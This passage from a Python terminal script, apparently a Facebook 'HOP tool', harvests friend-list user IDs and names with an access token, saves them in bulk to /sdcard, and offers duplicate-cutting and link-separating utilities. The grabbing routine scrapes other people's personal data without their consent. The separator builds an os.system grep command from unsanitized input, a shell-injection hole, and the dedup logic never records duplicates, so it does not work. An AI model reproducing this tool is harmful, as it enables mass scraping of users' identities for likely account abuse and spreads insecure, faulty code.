                nm = inayat['name']
                idsave.write(uids+'|'+nm+'\n')
            print('\033[1;37;1m[$] Grabbed from : \033[1;32;1m'+ids)
           # print('  Total friends: '+str(len(uids)))
            print('\033[1;37;1m[+] Token status : \033[1;32;1mLive')
            print(47*'\033[1;37;1m-')
            idsave.close()
        except Exception as e:
            #print(e)
            if 'invalid' in str(rg):
                print('\033[1;31;1mToken has expired, try again ...')
                os.system('rm -rf temp*')
                pass
            else:
                print('\033[1;37;1m[$] Grabbed from : \033[1;31;1m'+ids)
                print('\033[1;37;1m[+] Friendlist ids : \033[1;31;1m0')
                print('\033[1;37;1m[+] Token status : \033[1;32;1mLive')
                print(47*'\033[1;37;1m-')
                os.system('rm -rf temp*')
                pass
    lenid = open('/sdcard/'+save_file, 'r').readlines()
    print('\033[1;37;1m[+] Grabbing Process has completed ')
    os.system('rm -rf temp*')
    print('\033[1;37;1m[$] Total ids grabbed : \033[1;32;1m'+str(len(lenid)))
    print('\033[1;37;1m[+] File saved as: /sdcard/'+save_file)
    print(47*'-')
    input('Press enter to back ')
    main()
    
    
def helpv():
    os.system('clear')
    print(logo)
    print('\033[1;36m  How to create file in HOP tool.\033[0;97m')
    print('  Video link: https://www.facebook.com/100048514350891/posts/485671353060006/?app=fbl')
    print(46*'-')
    print('\033[1;36m  How to create fb ads access token for HOP tool.\033[0;97m')
    print('  Video link: https://www.facebook.com/100048514350891/posts/485671353060006/?app=fbl')
    print(46*'-')
    input('Press enter to back main menu ')
    main()
    
def cutter():
    dub=[]
    os.system('clear')
    logo()
    df = input('\033[1;37;1m[+] Put file name : ')
    print(46*'-')
    sdf = input('\033[1;37;1m[+] Save new file as : ')
    dc=0
    dfc = open(df, 'r').read().splitlines()
    for i in dfc:
        if i in dub:
            dc+=1
            print('[%s] Dublicate link : '%dc)
            pass
        else:
            open('/sdcard/'+sdf, 'a').write(i+'\n')
    print(46*'-')
    print('\033[1;37;1m[+] \033[1;32;1mThe process has completed')
    print(46*'\033[1;37;1m-')
    input('Press enter to back ')
    main()
    
def sep():
    os.system('clear')
    logo()
    try:
        limit = int(input('\033[1;37;1m[?] How many links do you want to separate : '))
        print(46*'-')
    except:
        limit = 1
    file_name = input('\033[1;37;1m[+] Input file name : ')
    print(46*'-')
    new_save = input('\033[1;37;1m[+] Save new file as : ')
    print(46*'-')
    y = 0
    for k in range(limit):
        y+=1
        links = input('[%s] Put links : '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> /sdcard/'+new_save)
    print(46*'-')
    print('\033[1;37;1m[+] \033[1;32;1mLinks grabbed successfully')
    print('\033[1;37;1m[+] \033[1;32;1mTotal grabbed links : '+str(len(open('/sdcard/'+new_save).read().splitlines())))
    print('\033[1;37;1m[+] \033[1;32;1mNew file saved as: /sdcard/'+new_save)
    print(46*'-')
    input('Press enter to back ')
    main()



if __name__ == '__main__':
    main()
